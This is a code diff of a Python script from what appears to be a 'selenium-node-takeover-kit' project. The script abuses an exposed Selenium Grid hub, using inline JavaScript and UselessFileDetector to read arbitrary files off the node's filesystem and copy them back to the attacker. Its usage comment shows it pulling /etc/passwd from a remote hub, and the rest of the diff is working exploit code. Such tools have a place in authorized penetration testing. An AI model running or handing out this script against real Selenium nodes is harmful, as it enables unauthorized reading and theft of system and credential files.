@@ -1,3 +1,11 @@
+#!/usr/bin/env python3
+# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_download.py
+# 
+# Downloads files off of the selenium nodes filesystem. This uses some inline js and UselessFileDetector to embed a file from the filestystem back into the inline page. As this encodes in base64, it should be able to handle binary files.
+#
+# pip3 install selenium
+# ./selenium_node_download.py -h http://selenium-hub.lan:4444/wd/hub -r /etc/passwd -l ./remote_hub_passwd
+
 import base64, getopt, sys
 from selenium import webdriver
 from selenium.webdriver.remote.file_detector import UselessFileDetector
@@ -20,44 +28,27 @@ def get_file_contents(driver, remote_file):
         print('Doesnt Exist: %s' % remote_file)
     return decoded_contents
 
-def write_local_file(local_file, file_contents):
-    " Simply write to a local binary file "
-    try:
-        f = open(local_file, 'w+b')
-        f.write(file_contents)
-        f.close()
-    except:
-        print('Cannot Write the following File: %s' % local_file)
-    return None
-
-def get_driver(url):
-    driver = webdriver.Remote(
-            command_executor=url,
-            desired_capabilities={'browserName': 'firefox'}
-            )
-    driver.file_detector = UselessFileDetector()
-    return driver
-
-def parse_args():
-    url_wd, remote_file, local_file = None, None, None
-    myopts, args = getopt.getopt(sys.argv[1:],':r:u:l:')
+if __name__ == '__main__':
+    hub_url, remote_file, local_file = None, None, None
+    myopts, args = getopt.getopt(sys.argv[1:],':h:r:l:')
     for o, a in myopts:
-        if o == '-u':
-            url_wd = a
+        if o == '-h':
+            hub_url = a
         elif o == '-r':
             remote_file = a
         elif o == '-l':
             local_file = a
 
-    return url_wd, remote_file, local_file
+    # Probably any browser would work here
+    driver = webdriver.Remote( command_executor=hub_url, desired_capabilities={'browserName': 'firefox'} )
+    driver.file_detector = UselessFileDetector()
 
-if __name__ == '__main__':
-    url_wd, remote_file, local_file = parse_args()
-    driver = get_driver(url_wd)
     try:
         file_contents = get_file_contents(driver, remote_file)
         if local_file:
-            write_local_file(local_file, file_contents)
+            f = open(local_file, 'w+b')
+            f.write(file_contents)
+            f.close()
         else:
             print(file_contents.decode('ascii'))
     finally:
